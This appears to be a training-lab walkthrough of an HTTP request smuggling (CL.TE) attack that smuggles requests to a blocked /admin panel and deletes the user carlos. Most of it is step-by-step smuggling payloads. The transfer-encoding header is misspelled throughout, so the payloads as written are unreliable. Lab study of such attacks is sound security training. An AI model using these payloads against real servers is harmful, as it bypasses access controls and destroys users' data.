# Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability

## This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. There's an admin panel at `/admin`, but the front-end server blocks access to it.

## To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user `carlos`

---

### step 1

send homepage (/) to repeater
change get request to post request
test payload

```
Tranfer-Encoding: chunked

0
GET /post?postId=5 HTTP/1.1
foo: x
```

![screenshot](./images/images_lab5/lab6_homepage_into_repeter_test_payload.jpg)

### step2

try to access admin

```
Tranfer-Encoding: chunked

0
GET /admin HTTP/1.1`
foo: x
```

![screenshot](./images/images_lab5/lab6_access_admin_page.jpg)

### step3

add payload

```
Tranfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 12

x=1
0
```

![screenshot](./images/images_lab5/lab6_testing_admin_payload.jpg)

### step4

```
0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 12

x=1
0
```

![screenshot](./images/images_lab5/lab6_testing_payload_to_delete_carlos_account.jpg)

### step5

send request

![screenshot](./images/images_lab5/lab6_delete_carlos_account.jpg)

### step6

lab solved

![screenshot](./images/images_lab5/lab6_test_to_access_admin.jpg)
